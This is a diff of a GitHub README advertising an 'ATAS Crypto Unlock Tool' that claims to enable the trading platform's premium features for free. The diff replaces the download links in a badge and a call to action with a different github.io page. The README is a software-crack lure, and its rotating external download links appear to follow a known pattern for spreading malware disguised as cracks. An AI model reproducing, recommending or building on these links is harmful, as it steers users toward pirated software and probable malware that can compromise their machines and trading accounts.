@@ -6,7 +6,7 @@
 <h1 align="center">⚡️ ATAS Crypto Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://atas-crypto-download.github.io/.github/" target="_blank">
+  <a href="https://atas-trading.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20ATAS%20Crypto%20Free%20for%20Windows-Enable%20Premium%20Features-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
          alt="Download ATAS Crypto Free for Windows" style="width: 540px; height: 37px;">
   </a>
@@ -93,7 +93,7 @@ Report issues or contribute via GitHub Issues or Pull Requests.
 ## ⭐️ Unlock ATAS Crypto – Order Flow Trading Platform
 
 Unlock all premium features of **ATAS Crypto**, including **footprint charts, DOM trading, and cluster analysis tools**.  
-[Download the Unlock Tool](https://atas-crypto-download.github.io/.github/) today and trade smarter.  
+[Download the Unlock Tool](https://atas-trading.github.io/.github/) today and trade smarter.  
 
 ---
 
